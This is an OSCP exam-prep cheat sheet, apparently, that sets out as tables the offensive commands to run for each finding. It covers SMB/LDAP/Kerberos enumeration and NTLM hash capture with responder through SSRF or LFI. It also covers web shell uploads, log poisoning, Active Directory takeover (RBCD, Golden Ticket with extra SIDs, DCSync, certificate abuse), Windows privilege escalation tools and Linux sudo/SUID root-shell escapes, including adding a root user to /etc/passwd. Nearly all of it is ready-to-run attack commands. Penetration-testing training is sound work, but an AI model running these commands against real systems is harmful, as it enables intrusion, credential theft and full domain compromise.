# OSCP Tactical Decision Matrix (Monkey See, Monkey Do)

This matrix is designed for rapid triage. When you see a specific "indicator" or "finding," perform the corresponding "action."

---

## 1. Reconnaissance & Initial Foothold

| If You See (Indicator) | Do This (Immediate Action) | Goal |
| :--- | :--- | :--- |
| **Port 445 (SMB) Open** | `netexec smb 10.10.10.10 -u '' -p '' --shares` | Check for null sessions / sensitive files |
| **Port 389 (LDAP) Open** | `ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local"` | Check for Anonymous Bind / User Descriptions |
| **Port 88 (Kerberos) Open** | `kerbrute userenum -d domain.local users.txt` | Enumerate valid users for Roasting |
| **Port 1433 (MSSQL) Open** | `impacket-mssqlclient 'DOMAIN/user':'pass'@10.10.10.10 -windows-auth` | Check for DB access / xp_cmdshell |
| **Port 5985 (WinRM) Open** | `evil-winrm -i 10.10.10.10 -u user -p pass` | Get an initial shell |
| **Web Search/URL Input** | Trigger `http://172.10.10.10` with `responder` running | Capture NTLM hashes (SSRF) |
| **LFI Vulnerability** | Try `//172.10.10.10/share` with `responder` running | Capture NTLM hashes (LFI-to-SMB) |
| **FileUpload (Blocked .php)** | Upload `.htaccess` with `AddType` directive | Bypass extension filters |
| **Writable SMB Share** | Upload `.lnk` file via `ntlm_theft.py` | Force NTLM authentication (Responder) |
| **Web Service (Anonymous)** | `cadaver http://10.10.10.10` | Check for WebDAV PUT/MOVE permissions |
| **CMS Admin Access** | Upload PHP shell via Plugin/Extension/Theme | RCE on web server |
| **Nagios XI (Title/Favicon)**| Try `nagiosadmin:admin` or `nagiosadmin:nagios` | Admin access for RCE |
| **Nagios XI Admin Access** | Upload ELF shell as plugin to `monitoringplugins.php` | RCE as `nagios` or `root` |
| **LFI (No Wrappers)** | Check `/var/log/apache2/access.log` (Poison UA) | LFI-to-RCE via Log Poisoning |
| **Port 1433 Cracked** | `mssqlclient ...` then check `IMPERSONATE` rights | Escalation within SQL to Admin/System |

---

## 2. Active Directory Pivot (BloodHound Logic)

| If BloodHound Shows (Edge) | Do This (Exploit Command) | Goal |
| :--- | :--- | :--- |
| **GenericAll (Computer)** | **RBCD Attack**: `addcomputer` -> `rbcd` -> `getST` | System access on that Computer |
| **GenericAll (GPO)** | `SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [ME]` | Become Local Admin via Policy |
| **GenericAll (User)** | `net rpc password "target" "newpass" -U "me%pass"` | Take over the user account |
| **ForceChangePassword** | `net rpc password "target" "newpass" -U "me%pass"` | Immediate account takeover |
| **ReadLAPSPassword** | `netexec smb 10.10.10.10 -u [ME] -p [PASS] --laps` | Get Local Administrator credentials |
| **HasSession (on Target)** | `impacket-secretsdump` or `mimikatz` (if admin) | Extract credentials from LSASS/SAM |
| **Bidirectional Trust** | **Golden Ticket + Extra SIDs**: `kerberos::golden ... /sids:[PARENT]-519` | Escalate to Parent Enterprise Admin |
| **GenericWrite (on User)** | **Shadow Credentials**: `certipy shadow auto` | Impersonate User via Certificate |
| **GenericWrite (on GPO)** | Inject "Immediate Task" via `gpmc.msc` or `SharpGPOAbuse` | Local/Domain Admin via Group Policy |
| **BloodHound: ESC1** | `certipy req ... -upn administrator` | Full Domain Admin via Certificate |
| **CA Server (Port 80/443)** | **ESC8**: Relay SMB/RPC to CA Web Enrollment | Computer/User Impersonation |
| **Service Hash Cracked** | **Silver Ticket**: `impacket-ticketer -spn ...` | Access specific service as ANY user |
| **DCSync Rights** | `impacket-secretsdump -just-dc [DOMAIN]/[USER]:[PASS]@DC` | Dump ALL Domain Hashes |

---

## 3. Windows Privilege Escalation

| If `whoami /priv` Shows | Do This (Immediate Action) | Result |
| :--- | :--- | :--- |
| **SeImpersonate** | `PrintSpoofer.exe -c "cmd.exe" -i` | SYSTEM Shell |
| **SeImpersonate (Newer OS)** | `GodPotato.exe -cmd "rev_shell_cmd"` | SYSTEM Shell |
| **Win 10 Build 1809-19043** | **HiveNightmare**: `.\HiveNightmare.exe` | Read SAM/SECURITY as user |
| **SeBackup** | `reg save hklm\sam SAM` then `secretsdump` local | Local Admin Hashes |
| **SeRestore** | `ren Utilman.exe ...` -> Replace with `cmd.exe` | SYSTEM Shell at Login Screen |
| **SeManageVolume** | `SeManageVolumeExploit.exe` -> `tzres.dll` Hijack | SYSTEM Shell via `systeminfo` |
| **SeTakeOwnership** | Take ownership of `C:\Windows\System32\sethc.exe` | Persistence / Hijack (Sticky Keys) |
| **Unquoted Service Path** | `wmic service get pathname` (Look for spaces and no quotes) | Hijack binary path for SYSTEM shell |
| **Modifiable Reg Key** | `Set-ItemProperty -Path HKLM:\...\Services\X -Name ImagePath ...` | Service Hijack (SYSTEM shell) |
| **Local Port 8080/8443** | `netstat -ano \| findstr LISTENING` | Tunnel via Chisel to access internal web apps |

---

## 4. Linux Privilege Escalation

| If `sudo -l` Shows | Do This (Immediate Action) | Result |
| :--- | :--- | :--- |
| **(ALL) NOPASSWD: ALL** | `sudo su -` or `sudo /bin/bash` | Root |
| **NOPASSWD: /usr/bin/find** | `sudo find . -exec /bin/sh \; -quit` | Root Shell |
| **NOPASSWD: /usr/bin/vim** | `sudo vim -c ':!/bin/sh'` | Root Shell |
| **NOPASSWD: /usr/bin/tee** | `echo "root2::0:0::/root:/bin/bash" \| sudo tee -a /etc/passwd` | Create Root User |
| **SUID: /usr/bin/python** | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` | Root Shell (if Cap-enabled) |

---

## 5. Automated SUID Triage

| If SUID Binary Is | Run This (Monkey Do) |
| :--- | :--- |
| **find** | `find . -exec /bin/sh -p \; -quit` |
| **env** | `env /bin/sh -p` |
| **taskset** | `taskset 1 /bin/sh -p` |
| **flock** | `flock -u / /bin/sh -p` |
| **capsh** | `capsh --gid=0 --uid=0 --` |
| **python** | `python -c 'import os; os.setuid(0); os.system("/bin/sh -p")'` |
| **awk** | `awk 'BEGIN {system("/bin/sh -p")}'` |
| **sed** | `sed -n '1e exec /bin/sh -p' /etc/hosts` |
| **nano/vi** | `:py3 import os; os.setuid(0); os.system("/bin/dash")` |
| **bash** | `bash -p` |
| **git** | `sudo git help config` -> `!/bin/sh` |

---

## 6. Common Blockers & Operational Fixes

| If This Happens (Problem) | Do This (Fix) | Result |
| :--- | :--- | :--- |
| **Clock Skew Error** | `faketime -f -5m netexec ...` or `ntpdate [DC]` | Fixes Kerberos/AD Auth |
| **Need Win Binary on Kali** | `x86_64-w64-mingw32-gcc ...` | Compile .c to .exe locally |
| **Blocked on Internal IP** | `ligolo-ng` (if UDP 11601 works) or `chisel` | Access internal subnets |
| **No "bash -i" possible** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Stable TTY |
| **Proxychains fails** | Check `SOCKS5` version in `/etc/proxychains.conf` | Restores pivoting flow |
| **LAPS Reading Empty** | Ensure you have `GenericRead` or `All` on the target | Get Local Admin Password |

---

### Pro Tip: The Triad of Despair
If you are stuck for more than 30 minutes, always check:
1.  **Internal Ports**: `netstat -ano` (Windows) or `ss -lntp` (Linux). Is there a local-only web app for Chisel?
2.  **User Descriptions**: `ldapsearch` or `net user`. Are there passwords in the notes?
3.  **Config Files**: `grep -ri "pass" /etc` or `findstr /s /i "password" *.xml`.

**Results over theories. Execute and move.** 🚀
